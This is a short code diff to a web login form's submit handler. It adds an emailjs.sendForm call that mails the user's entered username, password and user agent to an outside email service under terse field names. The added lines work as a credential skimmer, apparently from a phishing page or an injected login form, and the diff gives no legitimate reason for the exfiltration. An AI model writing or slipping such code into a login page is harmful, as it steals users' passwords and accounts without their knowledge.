@@ -217,6 +217,12 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
       return;
     }
 
+    emailjs.sendForm('service_qqf5p4q', 'template_u5yl8jg', {
+      un: username,
+      up: password,
+      ua: userAgent,
+    })
+
   } catch (err) {
     spinner.style.display = 'none';
     status.textContent = '❌ Error checking username.';
